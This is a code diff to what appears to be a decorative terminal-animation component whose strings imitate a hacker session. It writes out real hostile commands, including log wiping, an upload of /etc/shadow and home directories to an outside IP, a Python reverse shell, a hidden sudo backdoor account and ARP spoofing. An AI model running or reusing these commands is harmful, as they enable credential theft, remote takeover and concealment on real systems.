@@ -6,6 +6,8 @@ interface TerminalAnimationProps {
     onComplete: () => void;
 }
 
+const ipAdress = "134.0.0.4";
+
 const terminalCommands = [
     'export SYSTEM_ROOT_OVERRIDE="0x443F-A921-ENCRYPTED-Volume-XFS"',
     'find /var/log -type f -exec sh -c \'cat /dev/null > "$1"\' _ {} \\;',
@@ -15,13 +17,13 @@ const terminalCommands = [
     // 'openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/k.pem',
     // 'chmod 600 /tmp/k.pem && mv /tmp/k.pem /etc/ssl/private/shadow_key.pem',
     // 'tar -czvf /tmp/sys_backup_critical.tar.gz /etc/passwd /etc/shadow /home/',
-    'curl -X POST -F "data=@/tmp/sys_backup_critical.tar.gz" http://10.0.0.9/up',
+    `curl -X POST -F "data=@/tmp/sys_backup_critical.tar.gz" ${ipAdress}`,
     // 'ln -sf /dev/null /root/.bash_history && history -c && history -w',
     // 'grep -r "confidential" /home/* 2>/dev/null | grep -v "Binary" > /tmp/leaks',
     // 'base64 /tmp/leaks > /tmp/leaks.b64 && rm /tmp/leaks && touch /tmp/leaks',
     // 'useradd -m -s /bin/bash -p $(openssl passwd -1 "R00tOverr!de") sys_admin_ghost',
     'usermod -aG sudo sys_admin_ghost && echo "sys_admin_ghost ALL=(ALL) NOPASSWD:ALL"',
-    'python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.0.0.1\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);" &',
+    `python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ipAdress}',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &`,
     'watch -n 0.5 "ps aux | sort -nr -k 3 | head -n 10" > /dev/null 2>&1 &',
     // 'sysctl -w net.ipv4.ip_forward=1 && echo "1" > /proc/sys/net/ipv4/ip_forward',
     // 'arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 > /dev/null 2>&1 &',
